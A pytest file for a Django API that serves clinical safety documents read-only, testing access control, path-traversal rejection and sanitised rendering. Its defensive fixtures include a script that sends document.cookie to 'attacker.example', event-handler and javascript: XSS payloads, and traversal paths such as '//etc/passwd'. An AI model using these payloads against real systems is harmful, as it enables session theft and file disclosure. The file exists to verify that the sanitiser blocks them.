"""R10: read the controlled safety documents safely (TH-001, TH-005, TH-007)."""

from __future__ import annotations

import json
import os

import pytest
from django.urls import NoReverseMatch, reverse

from app.api.tests.test_hazard_writes import VALUES as HAZARD
from app.api.tests.test_organisations import adopt, appoint
from app.api.tests.test_organisations import team_context as team_context
from app.api.tests.test_safety_files import a_safety_file, make_user
from app.safetyfiles.documents import DOCUMENTS, MAX_DEPTH, render_document
from app.safetyfiles.models import Visibility
from app.safetyfiles.pdf_contract import PDF_PAGES
from app.safetyfiles.services import save_hazard
from safety_file import Author, git

pytestmark = pytest.mark.django_db

FICTIONAL = Author(name="Fictional Operator", email="operator@example.org")


@pytest.fixture
def owner():
    return make_user("cso@riverbank.example.nhs.uk")


@pytest.fixture
def file(owner):
    return a_safety_file(owner)


def url(file, key):
    return reverse("v1:safety-document", kwargs={"slug": file.slug, "key": key})


def commit_change(file, relative, content: str | bytes):
    """An out-of-band committed change, as an operator or restore might make."""
    path = file.repository_path / relative
    if isinstance(content, bytes):
        path.write_bytes(content)
    else:
        path.write_text(content, encoding="utf-8")
    git.run(["add", "--all"], cwd=file.repository_path)
    git.run(
        ["commit", "--quiet", "-m", "test: fixture"], cwd=file.repository_path, author=FICTIONAL
    )
    return file.repository().head_sha


def text_of(nodes) -> str:
    out = []
    for node in nodes:
        if node["type"] == "text":
            out.append(node["text"])
        elif node["type"] in {"reference", "unsupported"}:
            out.append(f"[{node.get('text') or node.get('description')}]")
        out.append(text_of(node.get("children", [])))
    return "".join(out)


def walk(nodes):
    for node in nodes:
        yield node
        yield from walk(node.get("children", []))


def test_the_readable_scope_is_exactly_the_controlled_pdf_scope():
    assert [d.path for d in DOCUMENTS] == [path for path, _ in PDF_PAGES]
    assert [d.key for d in DOCUMENTS] == [
        "overview",
        "risk-management-plan",
        "hazard-log",
        "safety-case-report",
    ]


@pytest.mark.parametrize("document", DOCUMENTS, ids=lambda d: d.key)
def test_each_document_reads_from_the_committed_source_and_cites_it(client, owner, file, document):
    save_hazard(file, owner, HAZARD, expected_head=file.repository().head_sha)
    head = file.repository().head_sha
    client.force_login(owner)
    response = client.get(url(file, document.key))
    assert response.status_code == 200, response.content
    assert response["Cache-Control"] == "private, no-store"
    body = response.json()
    assert body["head_sha"] == head
    assert body["document"]["source_commit"] == head
    assert body["document"]["path"] == f"docs/{document.path}"
    assert body["document"]["available"] is True
    assert body["document"]["unsupported"] == 0
    assert body["last_changed"]["author_name"]
    assert [d["key"] for d in body["documents"]] == [d.key for d in DOCUMENTS]
    assert text_of(body["document"]["blocks"]).strip()
    # Read-only: nothing was written.
    assert file.repository().head_sha == head
    assert file.repository().is_clean


def test_hazard_log_shows_derived_risk_and_cites_the_hazard_save(client, owner, file):
    _, head = save_hazard(file, owner, HAZARD, expected_head=file.repository().head_sha)
    client.force_login(owner)
    body = client.get(url(file, "hazard-log")).json()
    text = text_of(body["document"]["blocks"])
    assert "HAZ-001" in text and HAZARD["title"] in text
    assert "→ 4" in text  # derived initial risk level, computed by the generator
    assert body["last_changed"]["short_sha"] == head[:8]
    assert any(
        n["type"] == "anchor" and n["fragment"] == "haz-001"
        for n in walk(body["document"]["blocks"])
    )


@pytest.mark.parametrize(
    "key",
    ["index", "index.md", "..", "hazards", "HAZ-001", "mkdocs", "team", "OVERVIEW", "overview.md"],
)
def test_arbitrary_documents_and_paths_are_not_found(client, owner, file, key):
    client.force_login(owner)
    assert client.get(f"/api/v1/safety-files/{file.slug}/documents/{key}/").status_code == 404


@pytest.mark.parametrize(
    "suffix",
    [
        "documents/../../.turva/team.yaml",
        "documents/%2e%2e%2fmkdocs.yml/",
        "documents/hazards%2Findex.md/",
        "documents/docs/index.md/",
        "documents//etc/passwd/",
    ],
)
def test_traversal_never_reaches_a_repository_file(client, owner, file, suffix):
    client.force_login(owner)
    response = client.get(f"/api/v1/safety-files/{file.slug}/{suffix}")
    assert response.status_code == 404
    assert b"organisation" not in response.content and b"site_name" not in response.content


def test_route_accepts_only_a_slug_key():
    with pytest.raises(NoReverseMatch):
        reverse("v1:safety-document", kwargs={"slug": "x", "key": "../mkdocs.yml"})


def test_private_documents_are_not_disclosed(client, owner, file):
    other = make_user("j.okafor@riverbank.example.nhs.uk", first="Joseph", last="Okafor")
    client.force_login(other)
    for document in DOCUMENTS:
        assert client.get(url(file, document.key)).status_code == 404
    client.logout()
    assert client.get(url(file, "overview")).status_code == 403
    unverified = make_user("s.whitlock@riverbank.example.nhs.uk", verified=False)
    client.force_login(unverified)
    assert client.get(url(file, "overview")).status_code == 403


def test_published_documents_are_readable_but_not_editable(client, owner, file):
    file.visibility = Visibility.PUBLIC
    file.save(update_fields=["visibility"])
    reader = make_user("reader@example.org", first="Fictional", last="Reader")
    client.force_login(reader)
    assert client.get(url(file, "overview")).status_code == 200
    assert client.post(url(file, "overview"), {}, content_type="application/json").status_code in {
        403,
        405,
    }


def test_documents_are_read_only_for_every_method(client, owner, file):
    client.force_login(owner)
    head = file.repository().head_sha
    for method in ("post", "put", "patch", "delete"):
        response = getattr(client, method)(
            url(file, "overview"), {}, content_type="application/json"
        )
        assert response.status_code == 405
    assert file.repository().head_sha == head


@pytest.mark.parametrize("revocation", ["membership", "appointment", "account", "verification"])
def test_current_named_file_authority_is_required_to_read(client, team_context, revocation):
    context = team_context
    adopt(context)
    file = context["file"]
    client.force_login(context["colleague"])
    assert client.get(url(file, "overview")).status_code == 200
    if revocation in {"membership", "appointment"}:
        appoint(
            context["organisation"],
            context["admin"],
            context["members"][1],
            active=revocation != "membership",
            is_cso=False,
        )
    else:
        field = {"account": "is_active", "verification": "is_verified"}[revocation]
        setattr(context["colleague"], field, False)
        context["colleague"].save(update_fields=[field])
    assert client.get(url(file, "overview")).status_code in {403, 404}


def test_organisation_administration_is_not_document_authority(client, team_context):
    adopt(team_context)
    client.force_login(team_context["admin"])
    assert client.get(url(team_context["file"], "overview")).status_code == 404
    client.force_login(team_context["unnamed"])
    assert client.get(url(team_context["file"], "overview")).status_code == 404


def test_unsafe_content_is_never_executed_fetched_or_styled(client, owner, file):
    hostile = """# Overview

<script>fetch('https://attacker.example/steal?c=' + document.cookie)</script>

<img src="https://attacker.example/pixel.png" onerror="alert(1)" alt="tracking pixel">

![Supplier diagram](https://attacker.example/diagram.png)

<iframe src="https://attacker.example/"></iframe>

<style>body { display: none }</style>

<div style="background:url(https://attacker.example/bg)" onclick="alert(2)" class="md-typeset">Styled but kept text</div>

[Run me](javascript:alert(3)) [Data](data:text/html,<b>x</b>) [Local](file:///etc/passwd)
[Protocol-relative](//attacker.example/x) [NHS guidance](https://digital.nhs.uk/services/clinical-safety)
[Plan](clinical-risk-management-plan.md#4-risk-assessment) [Hazard file](hazards/HAZ-001-fictional.md)
[Outside](../../../.turva/team.yaml) [Top](#overview)
"""
    commit_change(file, "docs/index.md", hostile)
    client.force_login(owner)
    response = client.get(url(file, "overview"))
    assert response.status_code == 200
    document = response.json()["document"]
    raw = json.dumps(document)
    for forbidden in (
        "<script",
        "onerror",
        "onclick",
        "<iframe",
        "<img",
        "style=",
        "background:",
        "javascript:",
        "data:text",
        "file://",
        "attacker.example",
        "md-typeset",
    ):
        assert forbidden not in raw, forbidden
    nodes = list(walk(document["blocks"]))
    types = {node["type"] for node in nodes}
    assert types <= {
        "element",
        "text",
        "admonition",
        "anchor",
        "external",
        "document",
        "reference",
        "unsupported",
    }
    tags = {node["tag"] for node in nodes if node["type"] == "element"}
    assert not tags & {"script", "img", "iframe", "style", "a", "form", "svg"}
    for node in nodes:
        assert set(node.get("attrs", {})) <= {"id", "start", "colspan", "rowspan", "align"}
    externals = [node["href"] for node in nodes if node["type"] == "external"]
    assert externals == ["https://digital.nhs.uk/services/clinical-safety"]
    internal = [node for node in nodes if node["type"] == "document"]
    assert [(n["document"], n.get("fragment")) for n in internal] == [
        ("risk-management-plan", "4-risk-assessment")
    ]
    text = text_of(document["blocks"])
    assert "Styled but kept text" in text
    assert "source reference: hazards/HAZ-001-fictional.md" in text
    assert "source reference: ../../../.turva/team.yaml" in text
    assert "An image (tracking pixel) is not displayed" in text
    assert "An image (Supplier diagram) is not displayed" in text
    # Script, image, Markdown image, iframe, stylesheet, three refused schemes
    # and the protocol-relative link are all counted as not shown.
    assert document["unsupported"] == 9


def test_uncommitted_changes_are_not_presented_as_committed_evidence(client, owner, file):
    (file.repository_path / "docs" / "index.md").write_text("# Unreviewed edit\n", encoding="utf-8")
    client.force_login(owner)
    response = client.get(url(file, "overview"))
    assert response.status_code == 503
    assert "Unreviewed edit" not in response.content.decode()


def test_a_stale_generated_hazard_log_is_refused_not_shown(client, owner, file):
    save_hazard(file, owner, HAZARD, expected_head=file.repository().head_sha)
    log = (file.repository_path / "docs" / "hazards" / "index.md").read_text(encoding="utf-8")
    commit_change(file, "docs/hazards/index.md", log.replace("→ **4**", "→ **1**"))
    client.force_login(owner)
    document = client.get(url(file, "hazard-log")).json()["document"]
    assert document["available"] is False
    assert document["reason"] == "hazard-log-out-of-date"
    assert document["blocks"] == []
    assert "individual hazards are the authoritative record" in document["message"]


@pytest.mark.parametrize(
    ("change", "reason"),
    [
        ("delete", "missing"),
        ("symlink", "not-a-file"),
        ("binary", "not-text"),
        ("large", "too-large"),
    ],
)
def test_unavailable_documents_say_why_and_show_nothing(
    client, owner, file, tmp_path, change, reason
):
    target = file.repository_path / "docs" / "clinical-safety-case-report.md"
    if change == "delete":
        target.unlink()
        commit_change(
            file, "docs/index.md", (file.repository_path / "docs/index.md").read_text() + "\n"
        )
    elif change == "symlink":
        outside = tmp_path / "outside.md"
        outside.write_text("# Not evidence from this repository\n", encoding="utf-8")
        target.unlink()
        os.symlink(outside, target)
        commit_change(
            file, "docs/index.md", (file.repository_path / "docs/index.md").read_text() + "\n"
        )
    elif change == "binary":
        commit_change(file, "docs/clinical-safety-case-report.md", b"\x89PNG\r\n\x1a\n\xff\xfe")
    else:
        commit_change(file, "docs/clinical-safety-case-report.md", "x" * (512 * 1024 + 1))
    client.force_login(owner)
    response = client.get(url(file, "safety-case-report"))
    assert response.status_code == 200
    document = response.json()["document"]
    assert document["available"] is False
    assert document["reason"] == reason
    assert document["message"]
    assert document["blocks"] == []
    assert "Not evidence from this repository" not in response.content.decode()


def test_deeply_nested_content_is_refused_whole():
    nested = "".join("> " * depth + "level\n" for depth in range(1, MAX_DEPTH + 5))
    with pytest.raises(Exception):  # noqa: B017 - the internal bound, caught by read_document
        render_document(nested, "index.md")


def test_a_missing_repository_is_an_error_not_an_empty_document(client, owner, file):
    import shutil

    shutil.rmtree(file.repository_path)
    client.force_login(owner)
    response = client.get(url(file, "overview"))
    assert response.status_code == 503
    assert "could not read the safety evidence" in response.json()["detail"]


def test_tables_admonitions_and_heading_anchors_are_structured():
    rendered = render_document(
        """# Plan

!!! warning "Fictional caution"

    Check the **pathway**.

??? note "More detail"

    Hidden by default.

| Score | Meaning |
| :---: | ------- |
| 1     | Minor \\| negligible |
""",
        "clinical-risk-management-plan.md",
    )
    nodes = list(walk(rendered["blocks"]))
    admonitions = [n for n in nodes if n["type"] == "admonition"]
    assert [(a["kind"], a["title"], a["collapsible"]) for a in admonitions] == [
        ("warning", "Fictional caution", False),
        ("note", "More detail", True),
    ]
    cells = [n for n in nodes if n["type"] == "element" and n["tag"] in {"th", "td"}]
    assert cells[0]["attrs"] == {"align": "center"}
    assert text_of(cells[-1]["children"]) == "Minor | negligible"
    assert rendered["blocks"][0] == {
        "type": "element",
        "tag": "h1",
        "attrs": {"id": "plan"},
        "children": [{"type": "text", "text": "Plan"}],
    }
    assert rendered["unsupported"] == 0


@pytest.mark.parametrize(
    "href", ["http://[broken", "https://[::1", "https://example.org\uff0fsource"]
)
def test_malformed_links_are_reported_without_losing_the_document(client, owner, file, href):
    commit_change(file, "docs/index.md", f'# Overview\n\n<a href="{href}">Source evidence</a>\n')
    client.force_login(owner)
    response = client.get(url(file, "overview"))
    assert response.status_code == 200
    document = response.json()["document"]
    assert document["available"] is True
    assert document["unsupported"] == 1
    assert "Source evidence" in text_of(document["blocks"])
    assert "unsupported address" in text_of(document["blocks"])
    assert not any(node["type"] == "external" for node in walk(document["blocks"]))


@pytest.mark.parametrize("attribute", ["start", "colspan", "rowspan"])
@pytest.mark.parametrize("value", ["\u00b2", "1" * 5000, "0" * 5000 + "2"])
def test_unusable_numeric_attributes_do_not_crash_the_reader(attribute, value):
    source = (
        f'<ol start="{value}"><li>Recorded evidence</li></ol>'
        if attribute == "start"
        else f'<table><tr><td {attribute}="{value}">Recorded evidence</td></tr></table>'
    )
    rendered = render_document(source, "index.md")
    assert "Recorded evidence" in text_of(rendered["blocks"])
    assert all(attribute not in node.get("attrs", {}) for node in walk(rendered["blocks"]))


@pytest.mark.parametrize(
    "source",
    [
        '<details><summary>Warning <img src="https://example.org/warning.png" alt="Diagram"></summary>Body</details>',
        '<div class="admonition warning"><p class="admonition-title">Warning <img src="https://example.org/warning.png" alt="Diagram"></p><p>Body</p></div>',
    ],
)
def test_omitted_content_in_admonition_titles_is_counted_and_retained_as_a_placeholder(source):
    rendered = render_document(source, "index.md")
    assert rendered["unsupported"] == 1
    admonition = rendered["blocks"][0]
    assert any(node["type"] == "unsupported" for node in walk(admonition["title_nodes"]))
    assert "An image (Diagram) is not displayed" in text_of(admonition["title_nodes"])
    assert text_of(admonition["children"]) == "Body"


def test_admonition_titles_share_the_document_node_limit(client, owner, file, monkeypatch):
    title = "".join("<strong>Recorded heading</strong>" for _ in range(20))
    commit_change(file, "docs/index.md", f"<details><summary>{title}</summary>Body</details>")
    monkeypatch.setattr("app.safetyfiles.documents.MAX_NODES", 10)
    client.force_login(owner)
    response = client.get(url(file, "overview"))
    assert response.status_code == 200
    document = response.json()["document"]
    assert document["available"] is False
    assert document["reason"] == "too-complex"
    assert document["blocks"] == []


@pytest.mark.parametrize(
    ("attribute", "value"), [("start", "99999"), ("colspan", "100"), ("rowspan", "100")]
)
def test_supported_numeric_attributes_retain_their_upper_bounds(attribute, value):
    source = (
        f'<ol start="{value}"><li>Recorded evidence</li></ol>'
        if attribute == "start"
        else f'<table><tr><td {attribute}="{value}">Recorded evidence</td></tr></table>'
    )
    nodes = list(walk(render_document(source, "index.md")["blocks"]))
    assert any(node.get("attrs", {}).get(attribute) == int(value) for node in nodes)
